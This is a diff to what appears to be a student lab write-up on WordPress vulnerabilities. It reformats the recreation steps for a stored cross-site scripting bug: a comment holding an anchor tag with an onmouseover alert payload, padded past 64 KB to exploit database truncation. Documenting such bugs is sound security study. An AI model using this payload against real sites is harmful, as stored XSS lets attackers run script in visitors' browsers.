@@ -13,9 +13,10 @@ Time spent: **8** hours spent in total
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: ![](Exploit1.gif)
   - [ ] Steps to recreate: Create a comment with an alert that also contains comment text >64kb in size.
-  ```html
-<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
-        Use either a script to write out a comment of this size or simply Copy & Paste some text over and over until of adequate size.
+  ```
+  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+  ```
+   Use either a script to write out a comment of this size or simply Copy & Paste some text over and over until of adequate size.
   - [ ] Affected source code: N/A - MYSQL Limitation
 
 1. (Required) Authenticated Shortcode Tags Cross-Site Scripting (XSS)
